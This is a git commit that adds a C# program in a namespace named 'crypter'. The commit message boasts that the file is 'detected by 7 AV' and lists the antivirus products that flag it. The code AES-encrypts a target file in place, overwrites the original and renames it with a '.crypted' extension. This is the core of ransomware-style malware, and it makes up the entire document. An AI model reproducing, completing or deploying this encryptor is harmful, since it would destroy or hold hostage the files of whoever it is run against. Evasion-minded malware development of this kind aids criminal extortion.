0926ad0a6c84f4bfca69acb19343110935a65927
Andrey <kosoycoder@gmail.com>
2017-12-15 18:16:50 +0300

    Single file encryption, detected by 7 AV: CrowdStrike Falcon Endgame ESET-NOD32 Jiangmin McAfee McAfee-GW-Edition Sophos AV

---
+++ cr1/cr1/cr1/Program.cs
@@ -0,0 +1,89 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security;
+using System.Security.Cryptography;
+using System.IO;
+using System.Net;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+
+namespace crypter
+{
+    class Program1
+    {
+        public partial class forAES
+        {
+            // AES Algorytm
+            static public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes) // CS0120 without STATIC
+            {
+                byte[] encryptedBytes = null;
+                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (RijndaelManaged AES = new RijndaelManaged())
+                    {
+                        AES.KeySize = 256;
+                        AES.BlockSize = 128;
+
+                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                        AES.Key = key.GetBytes(AES.KeySize / 8);
+                        AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                        AES.Mode = CipherMode.CBC;
+
+                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                        {
+                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                            cs.Close();
+                        }
+                        encryptedBytes = ms.ToArray();
+                    }
+                }
+
+                return encryptedBytes;
+            }
+
+
+
+            // Create Password
+            public string CreatePassword(int length)
+            {
+                const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+                StringBuilder res = new StringBuilder();
+                Random rnd = new Random();
+                while (0 < length--)
+                {
+                    res.Append(valid[rnd.Next(valid.Length)]);
+                }
+                return res.ToString();
+            }
+
+            // Encrypt Single File
+            static void EncryptFile(string file, string password)
+            {
+                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+                // Hash the password with SHA256
+                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+                File.WriteAllBytes(file, bytesEncrypted);
+                System.IO.File.Move(file, file + ".crypted");
+                Console.Write(bytesToBeEncrypted);
+                Console.WriteLine("***");
+                Console.Write(passwordBytes);
+                Console.ReadLine();
+            }
+
+
+            static void Main()
+            {
+                string password = "0123456789012345";
+                EncryptFile("C:\\Users\\1\\OneDrive\\test\\txt.txt", password);
+            }
+        }
+    }
+}
